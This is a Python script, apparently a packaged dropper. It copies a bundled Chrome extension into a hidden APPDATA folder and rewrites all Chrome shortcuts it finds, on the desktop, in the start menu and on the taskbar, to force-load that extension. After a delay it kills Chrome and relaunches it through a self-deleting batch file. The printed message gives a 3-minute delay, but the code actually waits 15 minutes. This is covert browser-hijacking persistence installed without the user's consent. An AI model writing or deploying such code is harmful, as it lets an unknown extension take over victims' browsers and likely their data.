import os
import sys
import shutil
import winshell
from pathlib import Path
import time
import subprocess

if getattr(sys, 'frozen', False):
    current_directory = Path(sys._MEIPASS)
else:
    current_directory = Path(__file__).parent

internal_extension_path = current_directory / "extension"

external_extension_path = Path(os.environ['APPDATA']) / ".hidden_extension" / "extension"

try:
    if not external_extension_path.exists():
        external_extension_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copytree(internal_extension_path, external_extension_path)
        print(f"Extension folder copied to: {external_extension_path}")
except Exception as e:
    print(f"Failed to copy extension folder: {e}")
    sys.exit(1)

def create_taskbar_shortcut(chrome_path, extension_folder_path):
    taskbar_path = Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Internet Explorer', 'Quick Launch', 'User Pinned', 'TaskBar'))

    shortcut_name = "Google Chrome.lnk"
    shortcut_path = taskbar_path / shortcut_name

    if shortcut_path.exists():
        print(f"Taskbar shortcut already exists: {shortcut_path}")
        return

    try:
        with winshell.shortcut(shortcut_path) as link:
            link.path = chrome_path
            link.arguments = f'--load-extension="{extension_folder_path}"'
            link.description = "Google Chrome with extension"
            link.icon_location = chrome_path
            print(f"Taskbar shortcut created: {shortcut_path}")
    except Exception as e:
        print(f"Error creating taskbar shortcut: {e}")

def update_chrome_shortcuts(extension_folder_path):
    if not Path(extension_folder_path).exists():
        print(f"Error: The specified extension folder was not found: {extension_folder_path}")
        return

    desktop_path = Path(os.path.join(os.environ['USERPROFILE'], 'Desktop'))
    public_desktop_paths = [
        Path("C:/Users/Public/Desktop"),
        Path("C:/Users/Public/Public Desktop")
    ]
    start_menu_paths = [
        Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs')),
        Path("C:/ProgramData/Microsoft/Windows/Start Menu/Programs")
    ]
    taskbar_paths = [
        Path(os.path.join(os.environ['APPDATA'], 'Microsoft', 'Internet Explorer', 'Quick Launch', 'User Pinned', 'TaskBar')),
        Path(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Internet Explorer', 'Quick Launch', 'User Pinned', 'TaskBar'))
    ]

    possible_shortcut_names = ["Google Chrome.lnk", "Chrome.lnk"]

    shortcut_updated = False

    for shortcut_name in possible_shortcut_names:
        potential_desktop_shortcut = desktop_path / shortcut_name
        if potential_desktop_shortcut.exists():
            update_shortcut(str(potential_desktop_shortcut), str(extension_folder_path))
            shortcut_updated = True

        for public_desktop_path in public_desktop_paths:
            potential_public_desktop_shortcut = public_desktop_path / shortcut_name
            if potential_public_desktop_shortcut.exists():
                update_shortcut(str(potential_public_desktop_shortcut), str(extension_folder_path))
                shortcut_updated = True

        for start_menu_path in start_menu_paths:
            for path in start_menu_path.rglob(shortcut_name):
                update_shortcut(str(path), str(extension_folder_path))
                shortcut_updated = True

        taskbar_shortcut_found = False
        for taskbar_path in taskbar_paths:
            potential_taskbar_shortcut = taskbar_path / shortcut_name
            if potential_taskbar_shortcut.exists():
                update_shortcut(str(potential_taskbar_shortcut), str(extension_folder_path))
                shortcut_updated = True
                taskbar_shortcut_found = True

        if not taskbar_shortcut_found:
            chrome_exe_path = shutil.which("chrome")
            if chrome_exe_path:
                create_taskbar_shortcut(chrome_exe_path, extension_folder_path)

    if shortcut_updated:
        print("Chrome will restart in 3 minutes with the extension...")
        restart_chrome_via_bat(extension_folder_path)
    else:
        print("No valid Chrome shortcut found for updating and restarting.")

def update_shortcut(shortcut_path, extension_folder_path):
    try:
        with winshell.shortcut(shortcut_path) as link:
            if link.path and "chrome.exe" in link.path.lower():
                if link.arguments:
                    if f'--load-extension="{extension_folder_path}"' not in link.arguments:
                        link.arguments += f' --load-extension="{extension_folder_path}"'
                        print(f"Updated shortcut: {shortcut_path}")
                    else:
                        print(f"Shortcut already contains the required extension argument: {shortcut_path}")
                else:
                    link.arguments = f'--load-extension="{extension_folder_path}"'
                    print(f"Updated shortcut with new arguments: {shortcut_path}")
            else:
                print(f"Skipped shortcut (not Chrome): {shortcut_path}")
    except Exception as e:
        print(f"Error updating shortcut {shortcut_path}: {e}")

def restart_chrome_via_bat(extension_folder_path):
    time.sleep(900)

    subprocess.call("taskkill /im chrome.exe /f", shell=True)
    print("Chrome processes terminated successfully.")

    bat_file = external_extension_path / "launch_chrome.bat"
    with open(bat_file, "w") as f:
        f.write(f'start "" "chrome.exe" --load-extension="{extension_folder_path}"\n')
        f.write("exit\n")

    try:
        subprocess.Popen([str(bat_file)], shell=True)
        print("Chrome restarted with the extension via shortcut.")
    except Exception as e:
        print(f"Failed to restart Chrome via shortcut: {e}")
    finally:
        time.sleep(5)
        if bat_file.exists():
            bat_file.unlink()

update_chrome_shortcuts(external_extension_path)
